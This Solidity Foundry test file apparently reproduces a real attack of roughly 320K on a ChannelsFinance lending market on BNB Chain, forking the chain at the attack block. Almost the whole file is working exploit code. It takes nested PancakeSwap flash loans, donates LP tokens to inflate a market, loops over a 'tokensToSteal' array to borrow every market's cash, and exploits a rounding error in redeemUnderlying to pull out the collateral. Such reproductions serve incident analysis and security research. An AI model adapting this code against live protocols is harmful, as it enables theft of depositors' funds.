// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~320K
// Attacker : https://bscscan.com/address/0x20395d8e8a11cfd2541b942afdb810b7dcc64681
// Attack Contract : https://bscscan.com/address/0x07e536f23a197f6fb76f42ad01ac2bcdc3bf738e
// Vulnerable Contract : https://bscscan.com/address/0x93790c641d029d1cbd779d87b88f67704b6a8f4c
// First Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0x711cc4ceb9701d317fe9aa47187425e16dae7d5a0113f1430e891018262f8fb5
// Second Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0x93372ce9c86a25f1477b0c3068e745b5b829d5b58025bb1ab234230d3473b776

// @Analysis
// https://twitter.com/AnciliaInc/status/1741353303542501455

interface IcCLP_BTCB_BUSD is ICErc20Delegate {
    function gulp() external;
}

contract ContractTest is Test {
    ICErc20Delegate private constant cWBNB =
        ICErc20Delegate(payable(0x860DF3e99f6223D695aB51b2FB9eaa92Fa903E8D));
    ICErc20Delegate private constant cBUSD =
        ICErc20Delegate(payable(0xca797539f004C0F9c206678338f820AC38466D4b));
    ICErc20Delegate private constant cUSDT =
        ICErc20Delegate(payable(0xBa5B37100538Cde248AAA4c92FB330fCf91F557C));
    ICErc20Delegate private constant cUSDC =
        ICErc20Delegate(payable(0x33e68c922d19D74ce845546a5c12A66ea31385c4));
    ICErc20Delegate private constant cDAI =
        ICErc20Delegate(payable(0x7D247295a6938587C581f5Bb8CBD98A72388E530));
    ICErc20Delegate private constant cETH =
        ICErc20Delegate(payable(0x11797D61fD4BfF9728113601782D4444503093d7));
    ICErc20Delegate private constant cBTC =
        ICErc20Delegate(payable(0x7140A671Da66C0BD411E3fc3B15C51C36dBB5cA3));
    ICErc20Delegate private constant cFIL =
        ICErc20Delegate(payable(0xf77ef89255Fb387C6ebA1557c615A8B31A518aa2));
    IcCLP_BTCB_BUSD private constant cCLP_BTCB_BUSD =
        IcCLP_BTCB_BUSD(payable(0x93790C641D029D1cBd779D87b88f67704B6A8F4C));
    IERC20 private constant WBNB =
        IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant PancakeSwapToken =
        IERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);
    IERC20 private constant BTCB =
        IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IERC20 private constant BUSD =
        IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 private constant BUSDT =
        IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant ETHToken =
        IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    IERC20 private constant USDC =
        IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IERC20 private constant DAI =
        IERC20(0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3);
    ICointroller private constant Comptroller =
        ICointroller(0xFC518333F4bC56185BDd971a911fcE03dEe4fC8c);
    Uni_Pair_V3 private constant BUSDT_BTCB =
        Uni_Pair_V3(0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4);
    Uni_Pair_V3 private constant BUSDT_BUSD =
        Uni_Pair_V3(0x4f3126d5DE26413AbDCF6948943FB9D0847d9818);
    Uni_Pair_V2 private constant BTCB_BUSD =
        Uni_Pair_V2(0xF45cd219aEF8618A92BAa7aD848364a158a24F33);
    address private constant attackContract =
        0x07e536F23a197F6FB76F42aD01ac2Bcdc3BF738E;

    function setUp() public {
        vm.createSelectFork("bsc", 34806205);
        vm.label(address(cWBNB), "cWBNB");
        vm.label(address(cFIL), "cFIL");
        vm.label(address(cCLP_BTCB_BUSD), "cCLP_BTCB_BUSD");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(BTCB), "BTCB");
        vm.label(address(BUSD), "BUSD");
        vm.label(address(PancakeSwapToken), "PancakeSwapToken");
        vm.label(address(Comptroller), "Comptroller");
        vm.label(address(BUSDT_BTCB), "BUSDT_BTCB");
        vm.label(address(BUSDT_BUSD), "BUSDT_BUSD");
        vm.label(address(BTCB_BUSD), "BTCB_BUSD");
    }

    function testExploit() public {
        // Starting balances. Exploiter transfered amounts of tokens to attack contract before first attack tx
        // Transfer txs:
        // PancakeSwap Token: https://app.blocksec.com/explorer/tx/bsc/0x0237855c63eb85c5f437fba5267cc869a08c58a49501e3e5ebec9990bdd97565
        deal(address(PancakeSwapToken), address(this), 2e18);
        deal(address(BUSDT), address(this), 0);

        // At the end of the first tx attacker manipulated total supply value in vulnerable contract
        // This step was needed for increase borrowing power of attacker
        // I don't recreate the mentioned process because I have encountered specific underflow error when trying to liquidate borrowers positions
        // in the first attack tx

        emit log_named_decimal_uint(
            "Exploiter WBNB balance before attack",
            WBNB.balanceOf(address(this)),
            WBNB.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter BUSD balance before attack",
            BUSD.balanceOf(address(this)),
            BUSD.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter BUSDT balance before attack",
            BUSDT.balanceOf(address(this)),
            BUSDT.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter BTCB balance before attack",
            BTCB.balanceOf(address(this)),
            BTCB.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter ETHToken balance before attack",
            ETHToken.balanceOf(address(this)),
            ETHToken.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter USDC balance before attack",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter DAI balance before attack",
            DAI.balanceOf(address(this)),
            DAI.decimals()
        );

        emit log_string(
            "-----------------------------------------------------"
        );

        emit log_named_uint(
            "Total supply value in vulnerable contract after first attack tx",
            cCLP_BTCB_BUSD.totalSupply()
        );

        emit log_named_uint(
            "Exploiter cCLP_BTCB_BUSD balance after first attack tx",
            cCLP_BTCB_BUSD.balanceOf(attackContract)
        );

        // Transfer 2 tokens cCLP_BTCB_BUSD from attack contract to this contract.
        // I do this because of complications with first tx explained above
        // This step is needed to withdraw underlying BTCB_BUSD tokens later
        vm.prank(attackContract);
        cCLP_BTCB_BUSD.approve(address(this), type(uint256).max);
        cCLP_BTCB_BUSD.transferFrom(
            attackContract,
            address(this),
            cCLP_BTCB_BUSD.balanceOf(attackContract)
        );

        BUSDT_BTCB.flash(address(this), 0, 11_900e15, "");

        emit log_named_decimal_uint(
            "Exploiter WBNB balance after attack",
            WBNB.balanceOf(address(this)),
            WBNB.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter BUSD balance after attack",
            BUSD.balanceOf(address(this)),
            BUSD.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter BUSDT balance after attack",
            BUSDT.balanceOf(address(this)),
            BUSDT.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter BTCB balance after attack",
            BTCB.balanceOf(address(this)),
            BTCB.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter ETHToken balance after attack",
            ETHToken.balanceOf(address(this)),
            ETHToken.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter USDC balance after attack",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter DAI balance after attack",
            DAI.balanceOf(address(this)),
            DAI.decimals()
        );
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        if (msg.sender == address(BUSDT_BTCB)) {
            BUSDT_BUSD.flash(address(this), 0, 500_000e18, "");
            BTCB.transfer(address(BUSDT_BTCB), 11_900e15 + fee1);
        } else if (msg.sender == address(BUSDT_BUSD)) {
            // Transfer token amounts to pair and next mint liquidity
            (uint112 reserveBTCB, uint112 reserveBUSD, ) = BTCB_BUSD
                .getReserves();
            BTCB.transfer(address(BTCB_BUSD), (reserveBTCB * 115) / 100);
            BUSD.transfer(address(BTCB_BUSD), (reserveBUSD * 115) / 100);
            BTCB_BUSD.mint(address(this));
            // Transfer PancakeSwapToken to vulnerable contract
            PancakeSwapToken.transfer(
                address(cCLP_BTCB_BUSD),
                PancakeSwapToken.balanceOf(address(this))
            );

            emit log_named_uint(
                "Exploiter underlying BTCB_BUSD tokens balance before transfer to vulnerable contract",
                BTCB_BUSD.balanceOf(address(this))
            );

            // Transfer BTCB_BUSD to vulnerable contract
            BTCB_BUSD.transfer(
                address(cCLP_BTCB_BUSD),
                BTCB_BUSD.balanceOf(address(this))
            );

            emit log_named_uint(
                "Exploiter underlying BTCB_BUSD tokens balance after transfer to vulnerable contract",
                BTCB_BUSD.balanceOf(address(this))
            );

            cCLP_BTCB_BUSD.accrueInterest();

            // Enter to ChannelsFinance markets
            address[] memory cTokens = Comptroller.getAllMarkets();
            Comptroller.enterMarkets(cTokens);

            // At this moment exploiter can borrow more tokens than he should
            ICErc20Delegate[] memory tokensToSteal = new ICErc20Delegate[](7);
            tokensToSteal[0] = cWBNB;
            tokensToSteal[1] = cBUSD;
            tokensToSteal[2] = cUSDT;
            tokensToSteal[3] = cUSDC;
            tokensToSteal[4] = cDAI;
            tokensToSteal[5] = cETH;
            tokensToSteal[6] = cBTC;

            for (uint256 i; i < tokensToSteal.length; ++i) {
                uint256 amountToSteal = tokensToSteal[i].getCash();
                tokensToSteal[i].borrow(amountToSteal);
            }

            // redeemUnderlying function has rounding error.
            // Thanks to this attacker has used only one cCLP_BTCB_BUSD token to withdraw underlying tokens
            uint256 reserves = cCLP_BTCB_BUSD.totalReserves();
            uint256 redeemAmount = cCLP_BTCB_BUSD.getCash();
            cCLP_BTCB_BUSD.redeemUnderlying(redeemAmount - reserves - 1e9);
            emit log_named_uint(
                "Exploiter cCLP_BTCB_BUSD balance after call to redeemUnderlying()",
                cCLP_BTCB_BUSD.balanceOf(address(this))
            );
            emit log_named_uint(
                "Exploiter underlying BTCB_BUSD tokens balance after withdraw from vulnerable contract",
                BTCB_BUSD.balanceOf(address(this))
            );
            emit log_string(
                "-----------------------------------------------------"
            );
            BTCB_BUSD.transfer(
                address(BTCB_BUSD),
                BTCB_BUSD.balanceOf(address(this))
            );
            BTCB_BUSD.burn(address(this));
            BUSD.transfer(address(BUSDT_BUSD), 500_000e18 + fee1);
        }
    }
}
